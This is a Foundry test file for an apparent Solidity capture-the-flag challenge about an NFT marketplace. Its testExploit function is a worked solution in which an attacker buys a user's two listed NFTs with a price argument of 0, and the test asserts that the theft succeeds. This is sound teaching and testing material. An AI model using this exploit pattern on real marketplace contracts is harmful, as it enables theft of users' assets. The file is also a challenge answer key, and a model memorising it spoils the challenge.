// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {Utilities} from "../Utilities.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {Token} from "../../src/Token.sol";
import {NFT} from "../../src/NFT.sol";
import {BonanzaMarketplace} from "../../src/nft-bonanza/BonanzaMarketplace.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";

contract NFTBonanzaTest is Test {
  Utilities private utils;

  address payable private attacker;
  address payable private user;

  Token private usdc;
  NFT apes;
  NFT punks;
  BonanzaMarketplace market;

  function setUp() public {
    utils = new Utilities();

    address payable[] memory users = utils.createUsers(2);
    attacker = users[0];
    user = users[1];
    vm.label(attacker, "Attacker");
    vm.label(user, "User");

    usdc = new Token("USDC", "USDC");
    usdc.mint(user, 100e18);

    apes = new NFT("APES", "APES");
    punks = new NFT("PUNKS", "PUNKS");

    apes.mintForUser(user, 1);
    punks.mintForUser(user, 1);

    market = new BonanzaMarketplace(50, address(this), address(usdc));
    market.addToWhitelist(address(apes));
    market.addToWhitelist(address(punks));

    vm.startPrank(user);
    apes.setApprovalForAll(address(market), true);
    punks.setApprovalForAll(address(market), true);

    market.createListing(address(apes), 0, 1, 100e18, 0);
    market.createListing(address(punks), 0, 1, 100e18, 0);
    vm.stopPrank();
  }

  function testExploit() public {
    // Exploit start
    vm.startPrank(attacker, attacker);

    market.buyItem(address(apes), 0, user, 0);
    market.buyItem(address(punks), 0, user, 0);

    vm.stopPrank();
    // Exploit end

    validate();
  }

  function validate() private {
    assertEq(apes.balanceOf(attacker), 1);
    assertEq(punks.balanceOf(attacker), 1);
    assertEq(apes.balanceOf(user), 0);
    assertEq(punks.balanceOf(user), 0);
  }
}
